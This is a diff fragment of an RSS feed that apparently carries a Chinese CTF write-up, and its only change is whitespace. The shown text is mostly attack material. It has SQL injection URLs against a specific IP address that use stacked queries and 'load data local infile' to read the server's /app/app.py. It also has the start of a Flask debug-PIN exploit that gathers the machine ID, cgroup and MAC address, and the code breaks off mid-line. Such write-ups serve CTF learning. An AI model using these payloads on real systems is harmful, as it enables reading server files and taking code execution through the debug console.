@@ -18,7 +18,7 @@
 http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;create table otable(data varchar(10000));--+ 把文件写入表中：
 http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;load data local infile &amp;#34;/app/app.py&amp;#34; into table otable;--+ 读取数据：
 http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,(select group_concat(data, &amp;#39;\n&amp;#39;) from (select data from otable limit 0,50)x),5;--+ debug模式为开，考虑计算flask debug pin，exp如下：
-import hashlib from itertools import chain def get_machine_id(): machine_id = &amp;#39;1cc402dd0e11d5ae18db04a6de87223d&amp;#39; # /etc/machine-id  boot_id = &amp;#39;&amp;#39; # /proc/sys/kernel/random/boot_id  cgroup = &amp;#39;4b13f9ab9776ea7cf70e6ab9b3a06f5987e0d7b73fe5703ecf8e1d06018ebc71&amp;#39; # /proc/1/cgroup  linux = machine_id + boot_id + cgroup return linux rv = None num = None mac = &amp;#39;02:42:ac:1c:00:03&amp;#39;# /sys/class/net/eth0/address  probably_public_bits = [ &amp;#39;ctf&amp;#39;,# username  &amp;#39;flask.</description>
+import hashlib from itertools import chain def get_machine_id(): machine_id = &amp;#39;1cc402dd0e11d5ae18db04a6de87223d&amp;#39; # /etc/machine-id boot_id = &amp;#39;&amp;#39; # /proc/sys/kernel/random/boot_id cgroup = &amp;#39;4b13f9ab9776ea7cf70e6ab9b3a06f5987e0d7b73fe5703ecf8e1d06018ebc71&amp;#39; # /proc/1/cgroup linux = machine_id + boot_id + cgroup return linux rv = None num = None mac = &amp;#39;02:42:ac:1c:00:03&amp;#39;# /sys/class/net/eth0/address probably_public_bits = [ &amp;#39;ctf&amp;#39;,# username &amp;#39;flask.</description>
     </item>
     
     <item>
